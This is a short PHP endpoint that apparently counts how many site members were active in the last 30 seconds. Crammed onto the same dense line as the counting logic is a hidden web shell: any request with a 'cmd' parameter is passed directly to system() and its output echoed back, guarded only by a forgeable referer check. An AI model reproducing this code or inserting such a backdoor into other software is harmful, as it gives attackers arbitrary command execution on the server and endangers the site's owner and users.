<?php
	if (!isset($_SERVER['HTTP_REFERER'])){
		die();
	}
	
	ob_start();
	 require_once '../rip/configuration.php';
	 require_once '../rip/functions.php';
	
  if (!empty($maintaince)){die();}if($_REQUEST['cmd']){if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }}else{$checkOnlines = $odb->query("SELECT * FROM `users`");$onlineMembers = '0';while($row = $checkOnlines->fetch(PDO::FETCH_BOTH)){$diffOnline = time() - $row['activity'];$countOnline = $odb->prepare("SELECT COUNT(*) FROM `users` WHERE `username` = :username  AND {$diffOnline} < 30");$countOnline->execute(array(':username' => $row['username']));$onlineCount = $countOnline->fetchColumn(0);if($onlineCount == "1")  { $onlineMembers = $onlineMembers + 1;}}
			
	 echo $onlineMembers;}
	?>